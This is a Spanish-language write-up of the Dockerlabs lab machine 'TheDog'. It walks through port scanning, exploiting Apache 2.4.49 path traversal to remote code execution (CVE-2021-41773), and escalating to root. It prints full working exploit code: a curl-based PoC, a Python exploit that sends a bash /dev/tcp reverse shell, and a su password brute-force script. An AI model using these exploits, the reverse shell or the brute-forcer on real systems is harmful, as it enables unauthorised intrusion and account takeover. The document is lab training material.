
# Writeup Template: Maquina `[ TheDog ]`

- Tags: #TheDog
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina TheDog](https://mega.nz/file/eBEj2Q6L#9022vX1bmOvuO_F5YNfGCpdGGvWwKhiLCyVTJIVBpcM) Laboratorio con una web vulnerable donde se puede hacer la intrusión de distintas formas.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x thedog.zip
sudo bash auto_deploy.sh thedog.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.49 ((UnixSid))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
 whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.49], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.49 (Unix)], IP[172.17.0.2], Title[Comando Ping]
```

### Descubrimiento de Archivos
Para descubrir archivos ahora usaremos **wfuzz**, ya que desde el codigo fuente nos indica que tenemos que encontrar un archivo con extension **html** el cual no sabemos cual es nombre
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u "http://172.17.0.2/FUZZ.html" --hc=404 --hh=4688
```

- **Hallazgos**:
```bash
000000092:   200        28 L     66 W       766 Ch      "html"
```

Si ingresamos a esa ruta vemos que el archivo es valido:
```bash
http://172.17.0.2/html.html
```

Al ingresar a la web nos encontramos con esto:
```bash
# Objetivo

En principio a punky le gusta ping y hacer cosas raras con ese versatil comando
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Aunque no encontramos nada, si que hemos detectado que la version que tenemos de apache es desactualizado, ya que contempla de apache **( 2.4.49 )** y la version actual y estable es:
```bash
|Apache HTTP Server| 
|Stable release|**2.4.64** / July 10, 2025|
```

Buscando un exploit para esta version es especifico de la siguiente manera:
```bash
searchsploit Apache httpd 2.4.49
```

Encontrando este, que nos permite mediante **PathTraversal** derivarlo a un **RCE** ejecucion remota de comandos:
```bash
------------------------------------------------------------------------
 Exploit Title    |  Path
--------------------------------------------------------------------------------------------------------------
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)       | multiple/webapps/50383.sh
--------------------------------------------------------------------------------------------------------------
```

Este es el contenido del exploit:
```bash
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```
### Ejecucion del Ataque
Para explotar la version desactualizada usaremos el exploit del usuario  [maciiii](https://maciferna.gitbook.io/book/writeups/dockerlabs/thedog) que esta desarrollado en python3 para ganar acceso al objetivo
```python
import sys
import socket
import re
if len(sys.argv) != 2:
    print(f"\n\n[!] Escriba la dirección ip:\npython3 {sys.argv[0]} 127.0.0.1")
    sys.exit(1)
def send_request(command):
    path = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
    host = sys.argv[1]
    port = 80
    body = f"echo Content-Type: text/plain; echo; {command}"
    content_length = len(body)
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: request\r\n"
        f"Accept: */*\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )
    with socket.create_connection((host, port)) as s:
        s.sendall(request.encode())
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    final = response.decode(errors="ignore")
    output = re.search(r'text/plain\s*\r?\n\r?\n(.*)', final, re.DOTALL)
    print(output.group(1))
while True:
    try:
        command = input("Escriba el comando a ejecutar o shell para enviar una reverse shell: ")
        if command == "shell":
            port = int(input("Escriba el puerto donde quiere recibirla: "))
            host = input("Escriba su ip: ")
            shell = f'bash -c "bash -i >& /dev/tcp/{host}/{port} 0>&1"'
            send_request(shell)
        else:
            send_request(command)
    except KeyboardInterrupt:
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)
```

Igual lo llamamos **exploit** y lo ejecutamos de la siguiente manera donde solo nos pide como argumentos la direccion ip objetivo:
```bash
# Comandos para explotación
python3 exploit.py 172.17.0.2
```
### Intrusion
Una ves ejecutado nos ponemos en escucha para, lanzarnos una **revershell** ya que nos permite el exploit.
```bash
nc -nvlp 443
```

```bash
# Reverse shell o acceso inicial
Escriba el comando a ejecutar o shell para enviar una reverse shell: shell
Escriba el puerto donde quiere recibirla: 443
Escriba su ip: 172.17.0.1
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
punky:x:1001:1001:,,,:/home/punky:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando archivos del directorio **tmp** tenemos lo siguiente:
```bash
-rw-rw-r--  1 root punky  335 May 11 06:21 elevacion.log
-rw-r--r--  1 root root   115 May 11 06:08 punky_log.txt
-rw-rw-r--  1 root punky  656 May 11 06:18 punky_output.log
-rw-r--r--  1 root root   168 May 11 06:07 task_manager.log
```

Revisando no encontramos nada relevante, Como no tenemos como pasarnos herramientas la forma en que lo aremos es media copiar y pegar para poder realizar un ataque de fuerza bruta
```bash
alias="xclip -sel clip"
cat /usr/share/wordlists/rockyou.txt | head -n 1000 | xcp
```

Ahora copiamos el contenido del archivo SU-Force que es para realizar fuerza bruta:
```bash
cat /usr/bin/Sudo_BruteForce/Linux-Su-Force.sh | xcp
```

```bash
#!/bin/bash

# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.
mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
    echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
    exit 1
}

# Para imprimir un sencillo banner en alguna parte del script.
imprimir_banner() {
    echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
    echo "******************************"
    echo "*     BruteForce SU         *"
    echo "******************************"
    echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
}

# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)
finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.
if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

# Imprimimos el banner al momento de realizar el ataque.
imprimir_banner

# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.
while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"
        break
    fi
done < "$diccionario"
```

Lo creamos todo en el directorio **tmp** tanto, el **rockyou** como el archivo sh
una ves pegado le damos permisos de ejecucion
```bash
chmod +x Linux-su-force.sh
```

Ahora ejecutamos para el usuario **root** tambien:
```bash
bash Linux-su-force.sh punky rockyout.xt
Contraseña encontrada para el usuario punky: secret

bash Linux-su-force.sh root rockyout.xt
Contraseña encontrada para el usuario root: hannah
```

```bash
# Comando para escalar al usuario: ( root )
su root # ( hannah )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@872874e6ce3b:/tmp# whoami
root
```